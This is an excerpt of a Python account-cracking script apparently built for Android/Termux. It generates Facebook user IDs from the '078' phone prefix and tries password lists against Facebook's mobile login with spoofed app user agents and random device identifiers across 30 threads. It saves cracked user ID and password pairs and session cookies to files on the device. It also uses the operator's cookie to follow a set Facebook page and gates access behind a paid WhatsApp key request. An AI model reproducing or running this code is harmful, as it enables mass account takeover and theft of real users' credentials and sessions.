...
\033[1;32m------------------------------------------------
 Owner        :  𝑹𝑨𝒀𝑬𝑬𝑺 𝒀𝑨𝑺𝑰𝑹 
 AUTHOR       :  𝑴𝑹 𝒀𝑨𝑰𝑺𝑹
 WORKING      :  𝑴𝑬𝑻𝑯𝑶 2 078 𝑪𝑶𝑫𝑬 𝑪𝑯𝑶𝑰𝑪𝑬
 TEAM         :  𝑩𝑶𝑶𝑫𝑨 𝒁𝑬𝑨 𝑨𝑵𝑫 𝑶𝑴𝑰𝑫
 VIRSION      :  0.0.5
\033[1;37m------------------------------------------------"""
def linex():
	print('\033[1;37m----------------------------------------------')
...
def follow(ses,coki):
    ...
    r = sop(ses.get('https://mbasic.facebook.com/BaSir.OffiCail.AcCount4k', cookies={'cookie': coki}).text, 'html.parser')
...
def riaz():
  ...
  sxb = 'jamil'
  try:
    httpCaht = requests.get('https://raw.githubusercontent.com/YASIRomido1/approvedone/main/bad').text
    if id in httpCaht:
 ...
 #     print(" Easypaisa  Number     : +93792468624")
  #    print(" Trust Wallet Address : 0xb785952B2825366c8756fb65520F7Df8e0D145bD ")
      ...
      tks = ('Hello%20Yasir%20Sir%20!%20Please%20Approve%20My%20Key%20The%20AFG.PRO%20Key%20Is%20:%20'+id);os.system('am start https://wa.me/+93792468624?text='+tks)
      time.sleep(1)
      riaz()
  except:
    sys.exit()
...
def awmafghan():
		user=[]
		clear()
		print('\033[1;33mYour Country Code ,078')
		print('\033[1;37m----------------------------------------------')
		...
		try:
			...
			limit = 5000
		clear()
		print('\033[1;33m [1]METHODS[1]NOT\n [2]METHODS[2] WORKING API')
		print('\033[1;33m------------------------------------------------')
		mthd = input(' CHOOSE: ')
		clear()
		...
		with tred(max_workers=30) as AWM:	
			...
			print(' \033[1;35m𝑭𝑼𝑪𝑲 𝒀𝑶𝑼 𝑨𝑳𝑳 𝑩𝒀𝑷𝑨𝑺𝑺 𝑾𝑨𝑳𝑨😊')
			print('\033[1;33m------------------------------------------------')
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [YASIR-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                ...
                                awm_ua = 'Davik/2.1.0 (Linux; U; Android 11.0.1; Google Pixel 5 Build/ABC123) [FBAN/en_US;FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/{density=4.0,width=1080,height=2033};FBLC/pl_PL;FBRV/'+str(random.randint(000000000,999999999))+str(random.randint(000000000,999999999))+';FBCR/Etisalat;FBMF/Google;FBBD/Google;FBPN/com.facebook.katana;FBDV/Pixel 5;FBSV/11;FBOP/1;FBCA/arm64-v8a;]'
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/YASIR-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;33m [YASIR-OK] '+uid+' | '+pas+'\033[1;97m COOKIE = \033[1;37m'+coki+  '  ''  \033[0;97m')
                                                        open('/sdcard/YASIR-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;33m [YASIR-OK] '+uid+' | '+pas+'\033[1;97m COOKIE = \033[1;37m'+coki+  '  ''  \033[0;97m')
...
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [YASIR-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                ...
                                android_version=str(random.randrange(6,13))
                                mirwais = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.75,width=1080,height=2048};FBLC/en_US;FBRV/str(random.randint(000000000,999999999));FBCR/Etisalat;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/OPPO A31;FBSV/10;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                device_family_id = str(uuid.uuid4())
                                machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/YASIROK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;33m [YASIR-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/YASIR-COOKIE.txt','a').write(coki+'\n')
                                                ...
                                                print('\r\r\033[1;33m [YASIR-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/YASIR-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
